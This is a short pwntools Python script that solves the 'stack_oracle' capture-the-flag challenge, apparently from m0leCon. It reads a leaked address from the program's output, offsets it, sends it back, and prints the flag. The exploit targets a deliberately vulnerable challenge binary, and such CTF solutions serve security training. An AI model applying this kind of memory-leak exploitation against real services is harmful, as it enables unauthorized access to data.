#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./stack_oracle")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("stackoracle.challs.m0lecon.it", 1338)

    return r


def main():
    r = conn()

    flag_addr = int(re.match(r".* to (.+)\"", r.recvlinesS(2)[-1]).group(1), 16) + 8

    r.sendlineafter(b'HEX FORMAT": ', hex(flag_addr).encode("ascii"))
    flag = r.recvlinesS(3)[-2]

    log.success(flag)


if __name__ == "__main__":
    main()
